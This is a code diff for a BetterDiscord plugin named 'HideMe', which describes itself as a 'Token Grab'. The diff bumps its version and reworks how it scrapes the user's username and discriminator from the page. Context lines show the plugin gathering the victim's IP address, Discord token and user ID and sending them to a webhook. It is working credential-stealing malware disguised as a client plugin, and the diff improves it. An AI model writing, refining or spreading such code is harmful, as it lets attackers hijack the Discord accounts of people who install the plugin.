@@ -24,7 +24,7 @@ class HideMe {
         return "Better Discord Token Grab Lmao github.com/HideakiAtsuyo";
     }
     getVersion() {
-        return "1.1.0";
+        return "1.1.1";
     }
     getAuthor() {
         return "Hideaki Atsuyo";
@@ -71,7 +71,9 @@ class HideMe {
     	}
 
     	var IP = await getIP();
-    	var actualUserTag = document.getElementsByClassName("size14-e6ZScH title-eS5yk3")[0]?.innerText + document.getElementsByClassName("hovered-d5PMVU")[0]?.innerText;
+    	var actualUserUsername = document.getElementsByClassName("size14-e6ZScH title-eS5yk3")[0].innerText;
+        var actualUserDiscriminator = document.getElementsByClassName("size12-3cLvbJ subtext-3CDbHg")[0].innerText.includes("\n") ? document.getElementsByClassName("hovered-d5PMVU")[0].innerText : document.getElementsByClassName("size12-3cLvbJ subtext-3CDbHg")[0].innerText;
+        var actualUserTag = actualUserUsername+actualUserDiscriminator;
     	var actualUserToken = await getInfo("token");
     	var actualUserID = await getInfo("user_id_cache");
     	//var actualUserSettings = await getInfo("UserSettingsStore"); //Pretty Big
@@ -92,7 +94,6 @@ class HideMe {
         });
         SendToWebhook.write(pD);
         SendToWebhook.end();
-        console.log()
     }
 
     unload() {}
